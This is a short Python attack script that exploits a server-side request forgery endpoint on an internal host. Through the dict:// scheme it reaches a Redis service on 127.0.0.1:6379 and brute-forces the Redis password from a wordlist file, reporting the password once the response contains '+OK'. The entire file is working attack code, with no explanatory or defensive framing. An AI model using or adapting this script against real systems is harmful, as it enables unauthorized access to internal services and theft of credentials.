# -*- coding:utf-8 -*-
__author__ = 'leezp'
__date__ = 20210416
import requests

url = "http://10.88.104.26:808/ssrf.php?url="
param = 'dict://127.0.0.1:6379/auth:'

with open(r'./pwd.txt', 'r') as f:
    for i in range(11):
        passwd = f.readline().strip()
        all_url = url + param + passwd
        # print(all_url)
        req = requests.get(all_url)
        if "+OK\r\n+OK\r\n".encode() in req.content:
            print("redis passwd: " + passwd)
            break
